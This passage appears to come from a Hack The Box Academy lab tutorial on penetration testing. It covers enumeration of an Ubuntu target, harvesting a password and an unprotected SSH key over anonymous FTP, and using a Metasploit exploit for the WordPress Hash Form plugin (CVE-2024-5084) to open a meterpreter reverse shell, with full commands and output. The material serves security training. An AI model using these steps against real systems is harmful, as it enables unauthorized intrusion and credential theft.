|_ssl-date: 2025-02-23T21:09:33+00:00; +4s from scanner time.
| ssl-cert: Subject: commonName=WIN01
| Not valid before: 2025-02-22T20:56:06
|_Not valid after:  2025-08-24T20:56:06
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
<SNIP>
8000/tcp  open  ssl/http      Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
<SNIP>
8889/tcp  open  ssl/http      Golang net/http server
<SNIP>
49669/tcp open  msrpc         Microsoft Windows RPC
<SNIP>
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery:
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: WIN01
|   NetBIOS computer name: WIN01\\x00
|   Workgroup: HTBLAB\\x00
|_  System time: 2025-02-23T15:08:55-06:00
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2025-02-23T21:08:54
|_  start_date: N/A
|_clock-skew: mean: 1h12m04s, deviation: 2h41m01s, median: 3s

Service detection performed. Please report any incorrect results at <https://nmap.org/submit/> .
Nmap done: 1 IP address (1 host up) scanned in 157.72 seconds

```

Now, let's examine the results and write down any juicy information.

- Hostname: WIN01
- Operating System: Windows Server 2019 Standard (build 17763)
- File sharing: SMB on 445
- Remote Access: SSH on 22, RDP on 3389
- Web Server: Gitea
- Domain: cube-case.htb

A quick look at the web server running on TCP port 3000 will tell us more about what "Gitea" is.

![Cube Case Gitea homepage: A self-hosted Git service, easy to install, cross-platform, lightweight, and open source.](1tkouiqIUZy8)

First, if we do not know what this service is used for, we need to `do some research` on it. Then, we will figure out that Gitea is a tool that helps developers store and work on their computer code, acting central hub where teams can work together on software projects. With this tool developers can:

- Save all changes: Keep track of every change made to the code and lets developers go back to older versions if needed

- Helps teams to work together: Let multiple people work on the same project without getting in each other's way

- Improve collaboration: Let's multiple people work on the same project without getting in each other's way

- Check work quality: Make it easy for team members to review each other's work before accepting changes

- Organize projects: Help track tasks, problems, and project goals


Companies need tools like Gitea, Github, or Gitlab to keep their code organized and allow their development teams to work together. But there's a catch - if it's not set up safely, it can be dangerous. Code repositories often contains sensitive information like code, settings, or even credentials.

If we visit the [official documentation page](https://docs.gitea.com/) of Gitea, we will see the version of the most recent release. If we compare it to the one found on our target, we will see that they are using an outdated version of Gitea. It's very likely that there is some type of vulnerability or security gap, which has since been patched in the latest version, but may be present on our target.

* * *

## Summary

Let's summarize our findings from the low-hanging fruit reconnaissance of both targets:

#### Target 1 (10.129.12.19)

- Running Ubuntu operating system
- FTP service on port 21
- SSH access on port 22
- WordPress 6.7.2 installation
- Domain: cube-case.htb

Key findings: WordPress installation may have multiple attack vectors that require further assessment.

#### Target 2 (10.129.12.20)

- Windows Server 2019 Standard (build 17763)
- Hostname: WIN01
- Domain: cube-case.htb
- Multiple services running:
  - SMB file sharing (port 445)
  - SSH (port 22)
  - RDP (port 3389)
  - Gitea installation (port 3000)

Key findings: Outdated Gitea installation that may contain vulnerabilities and potentially sensitive information.

Both systems have possible security gaps that we should look into more closely next. Therefore, we will start with our first target (Ubuntu Linux).


# Linux Information Gathering

* * *

Next, we will perform additional information gathering and assess the collected data for vulnerabilities on the Ubuntu Linux target. These two stages go hand in hand. If we don't know what aspects of the target or its services to test, then we haven't gathered enough information. In that case, we need to step back and learn more about the services provided—their functions, purposes, the problems they solve, and how they are used.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](T9Od73JgJjki)

Let’s take another look at our initial findings. We've identified:

- Operating System: Ubuntu Linux
- File sharing: FTP on 21
- Remote Access: SSH on 22
- Web Server: WordPress 6.7.2
- Domain: cube-case.htb

* * *

## FTP

When dealing with FTP service, we can use the `ftp` client on our Pwnbox to connect to the target using the File Transfer Protocol (FTP).

FTP is a basic method for moving files between computers over a network—think of it as a digital courier service. It allows you to upload files to a remote computer (like sending packages) or download files from it (like receiving packages). As one of the oldest and simplest methods for sharing files over the internet, FTP acts as a bridge between two computers for data transfer. However, it's important to note that, in its basic form, FTP transmits data without encryption, making it unsuitable for transferring sensitive files securely.

When using the `ftp` client, we must specify the IP address and port to connect to—similar to providing a package carrier with a street address and house number. Since our Nmap results indicate that `anonymous` login is enabled, we can log in as `anonymous` to explore further. The FTP service will prompt us for a username and password, which, by default, are `anonymous:whatever`. The commands would look like the following:

```shell
ftp 10.129.12.10 21

Connected to 10.129.12.10.
220 ProFTPD Server (Debian) [10.129.12.10]
Name (10.129.12.10:pwnbox): anonymous

331 Anonymous login ok, send your complete email address as your password
Password: anonymous

230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.

ftp>

```

Once we're logged in, we can use the `ls` command to list all visible files within the default directory configured for the FTP service.

```shell
ftp> ls

229 Entering Extended Passive Mode (|||47456|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt
226 Transfer complete

```

Here, we see that there is a file called `WordPress_Blog_Setup_Update.txt`, which might contains some interesting data for us. We also see that the file is owned by the user `john` . After we add these findings to our notes, we download the file using the `get <filename>` command. We will take a closer look at it once we're finished with the FTP server.

```shell
ftp> get WordPress_Blog_Setup_Update.txt

local: WordPress_Blog_Setup_Update.txt remote: WordPress_Blog_Setup_Update.txt
229 Entering Extended Passive Mode (|||12725|)
150 Opening BINARY mode data connection for WordPress_Blog_Setup_Update.txt (964 bytes)
100% |**********************************************|   964       14.97 KiB/s    00:00 ETA
226 Transfer complete
964 bytes received in 00:00 (7.92 KiB/s)

```

Now, we can use the `ls -al` command which lists not only the visible files but also hidden files and directories. Let’s run the command and see what we get.

```shell
ftp> ls -al

229 Entering Extended Passive Mode (|||42851|)
150 Opening ASCII mode data connection for file list
drwxr-x---   4 john     john         4096 Feb 16 17:28 .
drwxr-x---   4 john     john         4096 Feb 16 17:28 ..
-rw-------   1 john     john         1153 Feb 15 21:13 .bash_history
-rw-r--r--   1 john     john          220 Jan  6  2022 .bash_logout
-rw-r--r--   1 john     john         3771 Jan  6  2022 .bashrc
drwx------   2 john     john         4096 Feb 15 17:16 .cache
-rw-------   1 john     john           20 Feb 16 16:34 .lesshst
-rw-r--r--   1 john     john          807 Jan  6  2022 .profile
drwxrwxr-x   2 john     john         4096 Feb 12 13:55 .ssh
-rw-r--r--   1 john     john            0 Feb 11 10:18 .sudo_as_admin_successful
-rw-------   1 john     john        17094 Feb 15 22:14 .viminfo
-rw-rw-r--   1 john     john          964 Feb 15 22:14 WordPress_Blog_Setup_Update.txt
226 Transfer complete

```

At this point, we see many hidden files and directories. If you have worked with Linux systems before, you will notice that it seems to be the home directory of a user (most likely `john`, based on the file permissions). Each of these files could contain important information for us, but first we will download the `.bash_history` file (which can reveal the existence of certain programs, files, directories, access, and more.)

```shell
ftp> get .bash_history

local: bash_history remote: bash_history
229 Entering Extended Passive Mode (|||39373|)
150 Opening BINARY mode data connection for bash_history (1285 bytes)
100% |**********************************************|  1285       51.01 KiB/s    00:00 ETA
226 Transfer complete
1285 bytes received in 00:00 (10.95 KiB/s)

```

Another potential goldmine is the `.ssh` directory. This directory (most of the time) is used to store files related to SSH, such as private keys, configs, and more. From those files, we could identify other machines/targets for remote access, or possibly obtain a private key that could be used gain remote access to the current target. Therefore, let’s use the `cd` command to change directory to `.ssh` and list all files within it.

```shell
ftp> cd .ssh

250 CWD command successful

ftp> ls -al

229 Entering Extended Passive Mode (|||26184|)
150 Opening ASCII mode data connection for file list
-rw-------   1 john     john         2602 Feb 12 13:55 id_rsa
-rw-r--r--   1 john     john          565 Feb 12 13:55 id_rsa.pub
226 Transfer complete

```

As you can see, there are two files in it - `id_rsa` and `id_rsa.pub` . When SSH keys are generated, and the user doesn’t modify them, these names are used by default. The `id_rsa` and `id_rsa.pub` files are a pair of SSH keys used for authentication:

- `id_rsa` is the private key that should be kept secret and never shared

- `id_rsa.pub` is the public key that can be shared with other systems


These keys work together like a lock and key. The public key ( `id_rsa.pub`) is installed on remote machines you want to connect to, while the private key ( `id_rsa`) on your local machine proves your identity. Now, let’s download the private key and exit the FTP connection.

```shell
ftp> get id_rsa

local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||41007|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes)
100% |**********************************************|  2602      108.80 KiB/s    00:00 ETA
226 Transfer complete
2602 bytes received in 00:00 (22.28 KiB/s)

ftp> exit

221 Goodbye.

```

On Pwnbox, we can now check all the files we have downloaded by using `ls -l`.

```shell
ls -l

total 16924
-rw-rw-r-- 1 htb-student htb-student    1285 Feb 15 16:12 .bash_history
-rw-rw-r-- 1 htb-student htb-student    2602 Feb 15 16:12 id_rsa
-rw-rw-r-- 1 htb-student htb-student     964 Feb 15 17:14 WordPress_Blog_Setup_Update.txt

```

First, let’s see what the WordPress Blog Setup Update file says:

```shell
cat WordPress_Blog_Setup_Update.txt

**Subject: Update on WordPress Blog Setup**

Dear Team,

We are currently in the process of setting up a new blog using WordPress.
To facilitate this setup, we have temporarily configured an FTP server.

Please note:
- This FTP server is for internal use only during the initial setup phase.
- Access credentials are temporary and will be revoked once the blog setup is complete or if security necessitates it.

However, we have recently received a high-priority ticket that requires immediate attention. As a result,
the completion of the blog setup will be slightly delayed. We are committed to addressing this urgent issue first to ensure our services remain uninterrupted.

We will notify the responsible parties as soon as the WordPress blog and web application are fully operational.
We appreciate your understanding and patience as we work to prioritize our tasks effectively.

Thank you for your cooperation.

Best Regards,
John Doe
Development Team

```

From a cybersecurity perspective, this file reveals several pieces of information that we should make a note of:

- It confirms the existence of a temporary FTP server that was set up for internal use during WordPress setup but is exposed

- It mentions "temporary access credentials", suggesting there might be default or weak credentials still in place (anonymous login enabled)

- It confirms the presence of an incomplete WordPress installation, which could mean security configurations are not fully implemented (Sample page)

- The message contains an employee name (John Doe) and indicates he's part of the Development Team

- It reveals internal processes and project status, which could be useful for social engineering attacks


In general, this kind of internal communication shouldn't be accessible through FTP, as it provides with valuable information about the system's setup and potential vulnerabilities during this transition period.

Next, let’s take a look at the `.bash_history` file. The `.bash_history` file is a hidden file in Linux/Unix systems that by default, keeps a record of all commands previously entered by a user in the Bash shell. Each time a user enters a command in their terminal, it gets logged to this file. This historical record can be very valuable from a security perspective as it may contain:

- Commands that reveal sensitive operations or configurations
- Usernames, passwords, or other credentials that were typed directly into the command line
- Information about system structure, file locations, and installed programs
- Evidence of file operations, installations, or system modifications

By default, Bash saves the last 500-1000 commands in this file, though this number can be configured.

```shell
cat .bash_history

<SNIP>
sudo rm -f /tmp/old_log.txt
sudo find /var/log -type f -name "*.gz" -delete
sudo systemctl restart rsyslog
cd /var/backups
ls -la
sudo tar -czf full_backup.tar.gz /etc /var/log
sudo mv full_backup.tar.gz /mnt/backup/
cd /mnt/backup
echo "john:SuperSecurePass123" | sudo chpasswd
<SNIP>

```

When reviewing the file, we notice that the password for the user `john` was changed. These credentials might be outdated, but they could also still work, so we can test them later. First, let's examine the SSH private key

```shell
cat id_rsa

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
<SNIP>
kRnXtk6X8U1DNfAAAAC2pvaG5AdWJ1bnR1AQIDBAUGBw==
-----END OPENSSH PRIVATE KEY-----

```

Most of the time, administrators protect their private keys from usage with a password. While generating such a private key, administrators have the option to encrypt it with a password which will require them to enter the correct password before the private key is applied for authentication. In such a case, where the SSH private key is protected would look like following:

```shell
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-256-CBC,5F2B1C4D6E7A8B9C0D1E2F3A4B5C6D7E

MIIEpAIBAAKCAQEAqkN6H2rKkQ92FxQnZf0tqK3d2T3N5X1zjUoL1F1g0J9sKxYz
<SNIP>
aB4eR6qL2nP1mJ8sV3rQ0kL9fT2pG7mR0cQ2sV4dN1rO8xZ5vT6aC9dP3lK4bY2sH
-----END RSA PRIVATE KEY-----

```

However, in our case the private key is not password protected and might be used for authentication. Let's summarize our key findings from the FTP service:

#### Access and Environment

- Anonymous FTP access was enabled on port 21
- We identified this as a home directory for user `john`
- Several important configuration and history files were accessible
- `.bash_history` file revealed potential credentials: `john:SuperSecurePass123`
- SSH private key ( `id_rsa`) was obtained and is not password protected
- WordPress setup documentation revealed temporary FTP configuration

#### Security Implications

- Exposed SSH private key could allow unauthorized system access
- FTP server was intended to be temporary but remained accessible
- Internal documentation exposed system configuration details
- Command history revealed sensitive operations and potential credentials

These findings provide multiple potential attack vectors, particularly through SSH access using either the discovered credentials or the unprotected private key. Next, let’s focus on WordPress.

* * *

## WordPress

Since we are dealing with WordPress — a very popular CMS — we can use a tool called `wpscan`. [WPScan](https://wpscan.com/) is a security tool designed to scan WordPress websites for valuable information and vulnerabilities. It automatically detects security issues, identifies weak spots in WordPress itself, and examines any installed plugins or themes for vulnerabilities. It can also enumerate usernames and test for weak passwords.

Let's run WPScan on the target. We'll enumerate plugins ( `-e p`), skip TLS checks ( `--disable-tls-checks`), set the plugin detection mode to passive ( `--plugins-detection passive`), and use 100 threads ( `-t 100`) to speed up the enumeration.

```shell
wpscan -e p --url https://10.129.12.10 --disable-tls-checks --no-banner --plugins-detection passive -t 100

[+] URL: <https://cube-case.htb/> [10.129.12.10]
[+] Started: Sat Feb 15 15:34:53 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.52 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: <https://10.129.12.10/xmlrpc.php>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - <http://codex.wordpress.org/XML-RPC_Pingback_API>
 |  - <https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/>
 |  - <https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/>
 |  - <https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/>
 |  - <https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/>

[+] WordPress readme found: <https://10.129.12.10/readme.html>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: <https://10.129.12.10/wp-cron.php>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - <https://www.iplocation.net/defend-wordpress-from-ddos>
 |  - <https://github.com/wpscanteam/wpscan/issues/1299>

[+] WordPress version 6.7.2 identified (Latest, released on 2025-02-11).
 | Found By: Rss Generator (Passive Detection)
 |  - <https://10.129.12.10/?feed=rss2>, <generator><https://wordpress.org/?v=6.7.2></generator>
 |  - <https://10.129.12.10/?feed=comments-rss2>, <generator><https://wordpress.org/?v=6.7.2></generator>

[+] WordPress theme in use: twentytwentyfive
 | Location: <https://10.129.12.10/wp-content/themes/twentytwentyfive/>
 | Last Updated: 2025-02-11T00:00:00.000Z
 | Readme: <https://10.129.12.10/wp-content/themes/twentytwentyfive/readme.txt>
 | [!] The version is out of date, the latest version is 1.1
 | Style URL: <https://10.129.12.10/wp-content/themes/twentytwentyfive/style.css?ver=1.0>
 | Style Name: Twenty Twenty-Five
 | Style URI: <https://wordpress.org/themes/twentytwentyfive/>
 | Description: Twenty Twenty-Five emphasizes simplicity and adaptability. It offers flexible design options, suppor...
 | Author: the WordPress team
 | Author URI: <https://wordpress.org>
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - <https://10.129.12.10/wp-content/themes/twentytwentyfive/style.css?ver=1.0>, Match: 'Version: 1.0'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:39 <==================> (109115 / 109115) 100.00% Time: 00:01:39
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] hash-form
 | Location: <https://10.129.12.10/wp-content/plugins/hash-form/>
 | Last Updated: 2025-01-29T15:54:00.000Z
 | [!] The version is out of date, the latest version is 1.2.4
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.1.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - <https://10.129.12.10/wp-content/plugins/hash-form/readme.txt>
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - <https://10.129.12.10/wp-content/plugins/hash-form/readme.txt>

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at <https://wpscan.com/register>

[+] Finished: Sat Feb 15 15:36:47 2025
[+] Requests Done: 109150
[+] Cached Requests: 13
[+] Data Sent: 29.515 MB
[+] Data Received: 14.722 MB
[+] Memory used: 545.891 MB
[+] Elapsed time: 00:01:54

```

Now, we've obtained some very useful information from WordPress that we should add to our documentation:

- Server Information: Apache/2.4.52 (Ubuntu)
- WordPress version confirmed: WordPress 6.7.2
- XML-RPC: Enabled and accessible
- Theme: twentytwentyfive v1.0
- Plugin: hash-form v1.1.0

As a side note, we also provide a [Hacking WordPress](https://academy.hackthebox.com/course/preview/hacking-wordpress) that focuses on WordPress CMS only.

At this point, we can start the Metasploit Framework (with the `msfconsole -q` command) to search for known vulnerabilities, and see if any of them would apply to the plugin version we have discovered.

```shell
msfconsole -q

msf6> search wordpress hash form

Matching Modules
================

   #  Name                                           Disclosure Date  Rank       Check  Description
   -  ----                                           ---------------  ----       -----  -----------
   0  exploit/multi/http/wp_hash_form_rce            2024-05-23       excellent  Yes    WordPress Hash Form Plugin RCE
   1    \\_ target: PHP In-Memory                     .                .          .      .
   2    \\_ target: Unix/Linux Command Shell          .                .          .      .
   3    \\_ target: Windows Command Shell             .                .          .      .
   4  auxiliary/scanner/http/wp_perfect_survey_sqli  2021-10-05       normal     Yes    WordPress Plugin Perfect Survey 1.5.1 SQLi (Unauthenticated)
   5  auxiliary/scanner/http/wp_learnpress_sqli      2020-04-29       normal     No     Wordpress LearnPress current_items Authenticated SQLi

Interact with a module by name or index. For example info 5, use 5 or use auxiliary/scanner/http/wp_learnpress_sqli

```

In this output, we can see that we have found an exploit for the WordPress Hash Form Plugin that seems to be vulnerable to a remote code execution ( `RCE`). Let’s take a closer look at the exploit and check if the plugin version from our target is vulnerable to that exploit. To accomplish this, we can use the command `info` with the appropriate index `0`.

```shell
msf6 exploit(multi/http/wp_hash_form_rce) > info 0

       Name: WordPress Hash Form Plugin RCE
     Module: exploit/multi/http/wp_hash_form_rce
   Platform: PHP, Unix, Linux, Windows
       Arch: php, cmd
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2024-05-23

<SNIP>

Description:
  The Hash Form – Drag & Drop Form Builder plugin for WordPress suffers from a critical vulnerability
  due to missing file type validation in the file_upload_action function. This vulnerability exists
  in all versions up to and including 1.1.0. Unauthenticated attackers can exploit this flaw to upload arbitrary
  files, including PHP scripts, to the server, potentially allowing for remote code execution on the affected
  WordPress site. This module targets multiple platforms by adapting payload delivery and execution based on the
  server environment.

References:
  <https://nvd.nist.gov/vuln/detail/CVE-2024-5084>
  <https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/hash-form/hash-form-drag-drop-form-builder-110-unauthenticated-arbitrary-file-upload-to-remote-code-execution>

```

The description states exploit works for all versions before and including the version 1.1.0, which is the same as we have on our target.

We have prepared a module called [Footprinting](https://academy.hackthebox.com/course/preview/footprinting) that goes in-depth for the most used services and teaches many different techniques to gather necessary information. Additionally, you also can find a module about [Using the Metasploit Framework](https://academy.hackthebox.com/course/preview/using-the-metasploit-framework) that teaches you how to utilize it efficiently.

![GIF showcasing the start of msfconsole through the commandline and search for wordpress related modules.](FsNgtGyYuf7a.gif)

Let’s summarize all of our findings for the target and note them down:

#### FTP

- Access and Environment
- Anonymous FTP access was enabled on port 21
- We identified this as a home directory for user `john`
- Several important configuration and history files were accessible

#### Critical Files

- `.bash_history` file revealed potential credentials: john:SuperSecurePass123
- SSH private key ( `id_rsa`) was obtained and is not password protected
- WordPress setup documentation revealed temporary FTP configuration

#### Security Implications

- Exposed SSH private key could allow unauthorized system access
- FTP server was intended to be temporary but remained accessible
- Internal documentation exposed system configuration details
- Command history revealed sensitive operations and potential credentials

#### WordPress

- Running WordPress version 6.7.2 (Latest version)
- Server: Apache/2.4.52 (Ubuntu)
- XML-RPC enabled and accessible
- Theme: twentytwentyfive v1.0
- Plugin: hash-form v1.1.0 - vulnerable to RCE (CVE-2024-5084)

As a result, we have several pieces of data that could provide access on our target. In the next section, we will test them out.


# Linux Initial Access

* * *

Before we continue, let’s take another look at the information we’ve written down.

#### Access and Environment

- Anonymous FTP access was enabled on port 21
- We identified this as a home directory for user `john`
- Several important configuration and history files were accessible
- `.bash_history` file revealed potential credentials: `john:SuperSecurePass123`
- SSH private key ( `id_rsa`) was obtained and is not password protected
- WordPress setup documentation revealed temporary FTP configuration

Our goal at this point is to test if the information we’ve found leads to a successful exploitation. In this case, we have three approaches that we can use.

1. WordPress exploit from the Metasploit Framework
2. SSH private key
3. Credentials

Now that we have gathered extensive information about our target and identified several potential methods for gaining initial system access, we can move on to the exploitation stage.

![Flowchart of the Penetration Testing Process: Pre-Engagement leads to Information Gathering, then to Vulnerability Assessment. This connects to Exploitation, Lateral Movement, and Post-Exploitation. All lead to Proof-of-Concept, ending with Post-Engagement.](pegrZJVP7orC)

* * *

## WordPress

Since we have found a potential and promising exploit on the Metasploit Framework, we will continue with WordPress. In order to use the exploit, we enter `use` command followed by the index number . Additionally, each exploit has specific options that need to be configured in order to execute properly. These options can be listed with the command `options`.

```shell
msf6 > use 0

[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/wp_hash_form_rce) > options

Module options (exploit/multi/http/wp_hash_form_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.1.50       yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory

```

In this case, we need to specify the remote hosts ( `rhosts`) and the remote port on which WordPress is running ( `rport`). The webserver happens to be using HTTPS , so we need to set `ssl` to `true`. Finally, we have to specify our own IP address, which will be used by the Metasploit Framework to connect back to us from our target. We can get our IP address by using the following command:

```shell
ifconfig tun0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.16.14  netmask 255.255.254.0  destination 10.10.16.14
        <SNIP>

```

Now, let’s set all the necessary options by using the command `set`:

```bash
msf6 exploit(multi/http/wp_hash_form_rce) > set rhosts 10.129.12.10
rhosts => 10.129.12.10

msf6 exploit(multi/http/wp_hash_form_rce) > set rport 443
rport => 443

msf6 exploit(multi/http/wp_hash_form_rce) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true

msf6 exploit(multi/http/wp_hash_form_rce) > set lhost 10.10.16.14
lhost => 10.10.16.14

```

Once everything is set, we can double-check the options and make sure that everything is set properly:

```shell
msf6 exploit(multi/http/wp_hash_form_rce) > options

Module options (exploit/multi/http/wp_hash_form_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.12.10     yes       The target host(s), see <https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html>
   RPORT      443              yes       The target port (TCP)
   SSL        true             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       The base path to the wordpress application
   VHOST                       no        HTTP server virtual host

Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.16.14      yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory

```

When all options are set correctly, we can use the command `exploit` to execute the exploit against the target:

```shell
msf6 exploit(multi/http/wp_hash_form_rce) > exploit

[*] Started reverse TCP handler on 10.10.16.14:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] Detected Hash Form plugin version: 1.1.0
[+] The target appears to be vulnerable.
[*] Attempting to retrieve nonce from the target...
[+] Nonce retrieved: 46e27af2d1
[*] Uploading PHP payload using the retrieved nonce...
[+] PHP payload uploaded successfully to <https://10.129.12.10/wp-content/uploads/hashform/temp/pdylenna.php>
[*] Triggering the payload...
[*] Sending stage (40004 bytes) to 10.129.12.10
[*] Meterpreter session 3 opened (10.10.16.14:4444 -> 10.129.12.10:45726) at 2025-02-26 15:07:52 -0500

meterpreter >

```

![GIF showcasing the configuration of the expected parameters by the module/exploit.](VDQPZFfISKnr.gif)

Let’s breakdown what it happening here:

1. The process kicks off with Metasploit starting a reverse TCP handler on our attacking machine (10.10.16.14:4444) to catch the incoming connection.

2. Then the automatic check confirms the plugin’s presence and vulnerability which is always a good sign we’re on the right track. An automatic check confirms the presence of the vulnerable plugin (a good sign that we're on the right track.)

3. Next, it grabs a nonce (46e27af2d1), a security token from the target, which it uses to authenticate the request. Next, it grabs a nonce (security token) from the target, `46e27af2d1`, which it uses to authenticate the request.

4. With that, it uploads a `meterpreter` payload written in PHP to the server’s `wp-content/uploads/hashform/temp/` directory as `pdylenna.php`. In other words, a payload is the piece of code that contains instructions to connect back to our attacking machine.

5. Then, it triggers the payload, executing our code on the target.

6. Finally, the Meterpreter session opens, giving us a full reverse shell from the target (10.129.12.10:45726) back to our attacking machine (10.10.16.14:4444) which means that we are in.


When the meterpreter prompt appears, we know that we've achieved initial access to the target. To confirm, we can run the command `sysinfo`, which returns information about about the current target machine. If you want to see all options that `meterpreter` offers you can use the command `help` .

```shell
meterpreter > sysinfo

Computer    : ubuntu
OS          : Linux ubuntu 5.15.0-135-generic #146-Ubuntu SMP Sat Feb 15 17:06:22 UTC 2025 x86_64
Meterpreter : php/linux

```

From here, we can use the `shell` command to tell meterpreter to execute a basic shell , where we can subsequently use system commands .

```shell
meterpreter > shell

Process 139137 created.
Channel 1 created.

```

At this point you might notice that it says that a process and a channel are created but nothing else. This is normal; when we use the command `id` to check if our shell is working, we will see the information about the current user that we are using. Additionally, we need to find out which directory we currently are. Therefore, let’s use the command `pwd` to print the working directory. Finally, we can take a look at the network interfaces and see the IP address of the current target by using the `ifconfig` command.

```shell
meterpreter > shell

Process 139137 created.
Channel 1 created.

id

uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)

pwd

/var/www/cube-case.htb/wp-content/uploads/hashform/temp

ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.12.10  netmask 255.255.0.0  broadcast 10.129.12.255
        inet6 dead:beef::250:56ff:feb9:20ab  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:20ab  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:20:ab  txqueuelen 1000  (Ethernet)
        RX packets 557155  bytes 124831990 (124.8 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29804  bytes 6037287 (6.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 529922  bytes 59680255 (59.6 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 529922  bytes 59680255 (59.6 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

![GIF showcasing the 'sysinfo' and 'shell' commands.](gbTbFkpEad15.gif)

Each of these commands, and their output, should be written down and accompanied by screenshots. This type of documentation serves as a proof of concept and describes the exact steps taken for getting initial access to the system through the vulnerable WordPress plugin.

* * *

## SSH

For SSH, we have two options that we can try to get access to the system. The first one is to use the SSH private key we found earlier. However, the private key itself doesn’t say to which user it belongs to. However, based on the ownership we saw in our FTP session, it seemed to belong to the user `john`. So, let’s try to use the private key for that user with the following command:

```shell
ssh -i id_rsa [email protected]

Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-135-generic x86_64)

 * Documentation:  <https://help.ubuntu.com>
 * Management:     <https://landscape.canonical.com>
 * Support:        <https://ubuntu.com/pro>

 System information as of Wed Feb 26 08:31:18 PM UTC 2025

  System load:           0.0
  Usage of /:            76.5% of 13.68GB
  Memory usage:          25%
  Swap usage:            14%
  Processes:             198
  Users logged in:       0
  IPv4 address for eth0: 10.129.12.10
  IPv6 address for eth0: dead:beef::250:56ff:feb9:20ab

Expanded Security Maintenance for Applications is not enabled.

153 updates can be applied immediately.
96 of these updates are standard security updates.
